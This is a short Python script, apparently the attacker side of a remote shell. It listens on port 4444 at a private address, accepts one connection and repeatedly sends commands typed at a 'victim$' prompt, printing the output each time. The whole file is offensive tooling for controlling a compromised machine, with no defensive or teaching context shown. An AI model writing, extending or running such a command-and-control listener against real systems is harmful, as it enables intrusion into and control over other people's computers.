import socket
import os
def listener():

    s = socket.socket()
    host = "192.168.1.143"
    port = 4444
    s.bind((host,port))
    print("")
    print("Server is currently running @" + host)
    print("Waiting for incoming connections")
    s.listen(1)
    (connection,addr) = s.accept()
    print(str(addr) + "Successfully connected to the server")

    while True :

        command = input(str("victim$ "))
        connection.send(command.encode())
        connection.recv(1024)
        output = connection.recv(5000)
        output.decode()
        print(output)

def main():

    print(listener())


if __name__ == "__main__":

    main()